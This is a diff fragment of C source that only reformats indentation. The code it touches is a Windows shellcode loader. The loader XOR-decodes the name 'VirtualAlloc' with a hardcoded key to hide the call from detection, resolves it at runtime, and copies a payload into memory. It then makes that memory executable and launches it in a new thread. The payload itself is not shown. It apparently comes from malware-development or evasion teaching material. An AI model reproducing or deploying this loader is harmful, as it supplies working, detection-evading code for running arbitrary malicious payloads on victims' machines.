@@ -53,19 +53,19 @@ char mySecretKey[] = "meowmeow";
 LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
-    int j;
-    j = 0;
-    for (int i = 0; i < data_len; i++) {
-            if (j == key_len - 1) j = 0;
-            data[i] = data[i] ^ key[j];
-            j++;
-    }
+  int j;
+  j = 0;
+  for (int i = 0; i < data_len; i++) {
+    if (j == key_len - 1) j = 0;
+    data[i] = data[i] ^ key[j];
+    j++;
+  }
 }
 
 int main(void) {
-	void * my_payload_mem; // memory buffer for payload
-	BOOL rv;
-	HANDLE th;
+  void * my_payload_mem; // memory buffer for payload
+  BOOL rv;
+  HANDLE th;
   DWORD oldprotect = 0;
 
   XOR((char *) cVirtualAlloc, cVirtualAllocLen, mySecretKey, sizeof(mySecretKey));
@@ -73,18 +73,17 @@ int main(void) {
   // Allocate a memory buffer for payload
   pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), cVirtualAlloc);
 
-	my_payload_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  my_payload_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
   // copy payload to buffer
   RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
 
   // make new buffer as executable
-	rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
-	if ( rv != 0 ) {
-
-      // run payload
-			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
-			WaitForSingleObject(th, -1);
-	}
-	return 0;
+  rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
+  if ( rv != 0 ) {
+  // run payload
+    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
+    WaitForSingleObject(th, -1);
+  }
+  return 0;
 }
